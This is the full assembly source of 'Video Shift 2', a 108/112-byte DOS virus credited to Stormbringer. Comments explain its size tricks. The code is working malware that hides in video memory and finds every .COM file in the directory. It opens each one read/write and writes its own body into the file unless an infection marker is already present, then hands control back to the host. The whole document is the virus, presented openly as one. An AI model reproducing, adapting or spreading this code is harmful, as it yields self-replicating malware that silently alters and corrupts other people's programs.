

;****************************************************************************
;*           Video Shift 2 - Ultra Small Version (108/112 bytes)            *
;*                                                                          *
;*                          Written by Stormbringer                         *
;*                                                                          *
;*   The 108-byte variant does not change the DTA, nor does it close files. *
;* These may cause errors to occur at times, but it is a working .COM file  *
;* virus.  If one deletes two semicolons to reinstate file closing, the size*  
;* of the virus goes up 4 bytes to 112 total.                               *
;****************************************************************************

.model tiny
.radix 16
.code
        org 100
start:
        mov     ax,0b900                ;I'm using a back page in video mem.
        mov     es,ax                   ;to store the virus while restoring
        mov     di,100                  ;the host and performing infections.
        mov     si,di                   ;Address=B900:100
        push    cs di di es             ;push numbers for later RETF's
        mov     cl,(end_prog-start+1)/2
        repnz   movsw                   ;Copy virus up into memory
        mov     ax,offset After_Jump
        push    ax
        retf                            ;Jump to new copy

After_Jump:
        push    ds
        pop     es
        mov     si,offset end_prog    
        pop     di
        mov     ch,0fe
        repnz   movsb                 ;Copy host to offset 100h

infect:
        push    cs
        pop     ds
        
        mov     ah,4e
        mov     dx,offset maske         ;*.COM
        
find_next:        
        int     21                      ;Find a file.
        jc      restore                 ;Return to host if none are found.
        
        push    es
        pop     ds
        mov     dx,9e                   ;DS:DX = filename

        mov     ax,3d02                 ;Open file READ/WRITE
        int     21                      
        xchg    ax,bx                   ;Put handle in BX

        push    cs
        pop     ds

        mov     dx,offset end_prog
        mov     ah,3f
        mov     ch,0ff                  ;Read in entire file
        int     21      
        
        push    ax
        cmp     byte ptr [end_prog],0b8 ;Check for infection
        je      done_infect
        
        mov     ax,4200
        xor     cx,cx
        xor     dx,dx                   ;Go back to beginning of file
        int     21

        pop     cx
        push    cx
        ;add     cx,end_prog-start       
        db      83,0c1,6dh               ;Use direct bytes: TASM adds NOP.
        inc     dh
        mov     ah,40
        int     21                       ;Write infected file back to disk

done_infect:
        pop     ax

        ;mov     ah,3e           ;Close file (optional)
        ;int     21              ;may be removed for a decrease of 4 bytes.
        
        mov     ah,4f           ;Find next file.
        jmp     find_next       ;Keep infecting files until it runs out.

restore:
        push    es
        pop     ds              ;Restore DTA to original and go to host prog.
        retf

maske   db      '*.COM',0       ;File mask for search routine.
                                ;Could be changed to '*.C*',0 
                                ;to eliminate one byte, but this would
                                ;cause misfires on things like .CAP and 
                                ;.CFG files.
end_prog:
        ret                     ;Not part of virus, just there for the
                                ;first run.
end start

